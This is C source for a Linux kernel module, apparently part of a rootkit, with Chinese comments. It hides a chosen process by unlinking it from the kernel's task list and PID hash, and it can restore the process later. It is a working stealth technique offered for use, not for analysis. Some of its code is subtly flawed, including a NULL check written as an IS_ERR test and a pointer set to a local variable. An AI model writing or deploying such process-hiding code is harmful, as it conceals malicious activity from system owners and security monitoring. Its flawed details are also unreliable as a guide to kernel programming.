#include <linux/version.h>
#include <linux/init_task.h>
#include "hide_pid.h"

static LIST_HEAD(hidden_pid_list_head); // 初始化链表头

struct pid_node
{
	pid_t pid_number;
	struct task_struct *task;
	struct list_head list;
};

// 摘链 隐藏PID
void hide_process(pid_t pid_number)
{
	struct pid_node *this_node = NULL;

	struct task_struct *task = NULL;
	struct hlist_node *node = NULL;

	struct pid *pid;
	pid = find_vpid(pid_number);
	if (!IS_ERR(pid))
	{
		task = pid_task(pid, PIDTYPE_PID);
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 11, 0)
		node = &task->pid_links[PIDTYPE_PID];
#else
		struct pid_link *link = NULL;
		link = &task->pids[PIDTYPE_PID];
		node = &link->node;
#endif
		list_del_rcu(&task->tasks);
		INIT_LIST_HEAD(&task->tasks);
		hlist_del_rcu(node);
		INIT_HLIST_NODE(node);
		node->pprev = &node;
		printk(KERN_INFO "PID: %d HIDE SUCCESS!\n", pid_number);

		this_node = kmalloc(sizeof(struct pid_node), GFP_KERNEL);
		this_node->task = task;
		this_node->pid_number = pid_number;
		list_add_tail(&this_node->list, &hidden_pid_list_head);
		printk(KERN_INFO "PID: %d ADD LIST SUCCESS\n", pid_number);
	}
	else
	{
		printk(KERN_ERR "Failed to hide process:%d with error %ld.\n", pid_number, PTR_ERR(pid));
	}
}

// 还原链表
void restore_process(pid_t pid_number)
{
	struct pid_node *entry = NULL, *next_entry = NULL;
	struct hlist_node *node;
	struct task_struct *task;

	printk("Succeeded in reappear process: %d\n", pid_number);

	list_for_each_entry(entry, &hidden_pid_list_head, list)
	{
		if (entry->pid_number == pid_number)
		{
			task = entry->task;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 11, 0)
			node = &task->pid_links[PIDTYPE_PID];
#else
			struct pid_link *link = NULL;
			link = &task->pids[PIDTYPE_PID];
			node = &link->node;
#endif
			hlist_add_head_rcu(node, &task->thread_pid->tasks[PIDTYPE_PID]);
			list_add_tail_rcu(&task->tasks, &init_task.tasks);
			printk("Unhiding: %d", pid_number);
		}
	}

	list_for_each_entry_safe(entry, next_entry, &hidden_pid_list_head, list)
	{
		if (entry->pid_number == pid_number)
		{
			list_del(&entry->list);
			kfree(entry);
		}
	}
}

void hide_exit(void)
{
	struct pid_node *entry = NULL, *next_entry = NULL;

	list_for_each_entry_safe(entry, next_entry, &hidden_pid_list_head, list)
	{
		list_del(&entry->list);
		kfree(entry);
	}
}